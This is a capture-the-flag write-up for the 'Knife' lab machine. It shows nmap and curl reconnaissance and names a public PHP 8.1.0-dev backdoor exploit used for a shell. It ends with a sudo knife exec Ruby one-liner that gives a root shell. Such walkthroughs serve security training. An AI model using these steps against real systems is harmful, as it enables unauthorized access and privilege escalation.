# Knife

To start off, `nmap`

```
# Nmap 7.92 scan initiated Sat Aug 21 09:24:36 2021 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.10.242
Nmap scan report for box.ip (10.10.10.242)
Host is up, received syn-ack (0.062s latency).
Scanned at 2021-08-21 09:24:36 +07 for 10s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k=
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc=
|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 21 09:24:46 2021 -- 1 IP address (1 host up) scanned in 9.90 seconds
```

First, we check the web server on port 80. Looking around the home page doesn't reveal anything useful, and `gobuster` doesn't return anything good either. Looking at the response headers ...

```sh
$ curl 10.10.10.242 -v
*   Trying 10.10.10.242:80...
* Connected to 10.10.10.242 (10.10.10.242) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.242
> User-Agent: curl/7.78.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 21 Aug 2021 05:56:37 GMT
< Server: Apache/2.4.41 (Ubuntu)
< X-Powered-By: PHP/8.1.0-dev
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8
<
```

... we see that the server is running `PHP`. Looking up "PHP 8 exploit", we can find a [backdoor RCE](https://www.exploit-db.com/exploits/49933), which we can download and run to get code execution, giving us a shell as "james".

Looking at `sudo` ...

```sh
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

We see that "james" can run `/usr/bin/knife` without a password.

```
$ knife
[snip]
** EXEC COMMANDS **
knife exec [SCRIPT] (options)
[snip]
```

Running `knife`, we see the sub-command `exec` which takes in a ruby file, so we create a `.rb` file which spawns `bash`

```rb
#!/opt/chef-workstation/embedded/bin/ruby
exec "/usr/bin/bash"
```

... and run `sudo knife exec shell.rb` to get a root shell.
